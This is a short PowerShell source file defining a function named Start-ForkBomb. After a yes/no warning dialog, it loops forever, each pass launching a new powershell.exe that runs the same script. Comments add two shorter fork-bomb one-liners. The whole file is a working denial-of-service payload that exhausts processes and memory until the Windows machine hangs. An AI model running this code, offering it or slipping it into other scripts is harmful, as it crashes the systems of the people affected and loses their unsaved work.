function Start-ForkBomb
{
#.AUTHOR https://raw.githubusercontent.com/Hackstur
    $result = [System.Windows.Forms.MessageBox]::Show('This is potentially EXTREMELY dangerous to run. Are you sure?' , "WARNING!" , 4)
    
    if ($result -eq 'Yes') {
    While (1) 
        { 
            $WScript = New-Object -com wscript.shell; $WScript.Exec("powershell.exe &" + $PSCommandPath); 
            #Alt1: For(){Ps|Ii}
            #Alt2: For(){ Sajb{ For(){ } } }
        }     
    }
}